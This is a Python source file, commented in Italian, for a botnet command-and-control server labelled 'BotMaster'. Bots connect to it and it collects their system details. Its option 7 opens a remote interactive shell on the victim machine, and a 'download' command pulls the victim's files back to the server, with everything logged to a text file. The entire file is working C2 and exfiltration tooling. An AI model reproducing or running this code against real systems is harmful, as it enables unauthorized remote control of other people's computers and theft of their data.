from socket import *
import tqdm
import select
serverPort = 12003
 #Dimensione del buffer, in questo caso il messaggio ricevuto puo essere al piu 4kb ma possiamo ovviamente aumentare nel caso
BUFFER_SIZE = 1024 * 128
serverSocket = socket(AF_INET,SOCK_STREAM)
serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
serverName = gethostbyname(gethostname())
serverSocket.bind(('',serverPort))
serverSocket.listen(10)
print('Il BotMaster con indirizzo IP:',serverName, 'e\' pronto a ricevere le informazioni dalla Botnet client...')



def invia_messaggio(messaggio):
    global connectionSocket
    try:
        connectionSocket.send(messaggio.encode('utf-8','ignore'))
        return True
    except Exception as e:
        #Il client si e' disconnesso nel mentre, tentiamo la riconnessione a un bot
        print(str(e))
        print("Client disconnesso, si tenta la riconnessione")
        connectionSocket.close()
        connectionSocket, addr = serverSocket.accept()
        print ("Messaggio non inviato, bot master connesso ad un bot con indirizzo" + str(addr))
        cwd = ricevi_messaggio()
        return False


def ricevi_stampa_messaggio():
    global connectionSocket
    messaggio = str(ricevi_messaggio())
    f = open("Info.txt", "a")
    f.write(messaggio)
    f.close()
    print(messaggio)

def ricevi_messaggio():
    global connectionSocket
    try:
        messaggio = ""
        numripetizioni = connectionSocket.recv(BUFFER_SIZE).decode('utf-8', 'ignore')
        if (not numripetizioni.isdigit()):
            raise Exception
        invia_messaggio("SIZE RICEVUTA")
        for x in range(0, int(numripetizioni)):
            messaggio = messaggio + connectionSocket.recv(BUFFER_SIZE).decode('utf-8','ignore')
        return str(messaggio)
    except Exception as e:
        #Il client si e' disconnesso nel mentre, tentiamo la riconnessione a un bot
        print(str(e))
        print("Client disconnesso, si tenta la riconnessione")
        connectionSocket.close()
        connectionSocket, addr = serverSocket.accept()
        print ("Messaggio non ricevuto, bot master connesso ad un bot con indirizzo" + str(addr))
        cwd = ricevi_messaggio()
        return ""

def menu():
    print("\nScegliere l'operazione da eseguire:\n"
          +"0: termina la connessione\n"
          +"1: ricevi informazioni sul sistema operativo\n"
          +"2: ricevi informazioni sul processore\n"
          +"3: ricevi informazioni sul tempo d'avvio\n"
          +"4: ricevi informazioni sulla memoria RAM\n"
          +"5: ricevi informazioni sul disco\n"
          +"6: ricevi informazioni sulla rete\n"
          +"7: entra in controllo della bash\n"
          +"8: pulisci il file di log\n"
          +"9: riepilogo informazioni\n")
    return input()

def ricevi_file(nome,size):
    invia_messaggio("Pronto")
    progress = tqdm.tqdm(range(size), f"Ricevo {nome}", unit="B", unit_scale=True, unit_divisor=1024)
    ricevuti = 0
    with open(nome, "wb") as f:
        while True:
            # read 1024 bytes from the socket (receive)
            if(ricevuti < size):
                bytes_read = connectionSocket.recv(BUFFER_SIZE)
                ricevuti += len(bytes_read)
                # write to the file the bytes we just received
                f.write(bytes_read)
                progress.update(len(bytes_read))
            else:
                break

try:
    while True:
        connectionSocket, addr = serverSocket.accept()
        print('\nNuova Botnet client connessa al BotMaster', addr)
        cwd = ricevi_messaggio()

        while True:
            comando = menu()

            if comando == '7':
                cmd = ''
                while cmd.lower() != "exit": #Finche non scegliamo di uscire dalla bash
                    cmd = input(f"{cwd}$>") #stampiamo la cwd, prendiamo il comando da eseguire e lo mandiamo
                    if (cmd == ""): continue
                    if cmd.lower() != "exit" and cmd.lower().split()[0] != "download":
                        if (not(invia_messaggio(f"7<sep>{cmd}"))):
                            break
                        output = ricevi_messaggio()
                        risultato = output.split('<sep>')
                        if (len(risultato)==1):
                            output = output + '<sep>' + ""
                        queryRes, cwd = output.split('<sep>')
                        f = open("Info.txt", "a")
                        f.write("Comando inviato: " + cmd)
                        f.write("\nRisultato:\n")
                        f.write (queryRes)
                        f.write("\n\n\n")
                        f.close()
                        print(queryRes + "\n")
                    elif cmd.lower().split()[0] == "download" and len(cmd.split())>=2:
                        if (not(invia_messaggio(f"7<sep>{cmd}"))):
                            break
                        output = ricevi_messaggio()
                        if(output.split("<sep>")[0] =="File esistente"):
                            print("Attendo la size")
                            output = ricevi_messaggio()
                            size = int(output)
                            ricevi_file(cmd.split(" ", 1)[1],size)
                            output = ricevi_messaggio()
                            risultato = output.split('<sep>')
                            if (len(risultato)==1):
                                output = output + '<sep>' + ""
                            queryRes, cwd = output.split('<sep>')
                            f = open("Info.txt", "a")
                            f.write("Comando inviato: " + cmd)
                            f.write("\nRisultato:\n")
                            f.write (queryRes)
                            f.write("\n\n\n")
                            f.close()
                            print(queryRes + "\n")
                        else:
                            print("Il file richiesto non esiste")

            elif comando == '8':
                f = open("Info.txt", "a")
                f.truncate(0)
            elif comando == "": continue
            else:
                msginviato = invia_messaggio(comando)
                if (comando != "0"):
                    if msginviato: ricevi_stampa_messaggio()
                else:
                    break

        connectionSocket.close()
        print("Precedente connessione terminata, BotMaster in attesa di un nuovo bot")
finally:
    connectionSocket.shutdown(SHUT_RDWR)
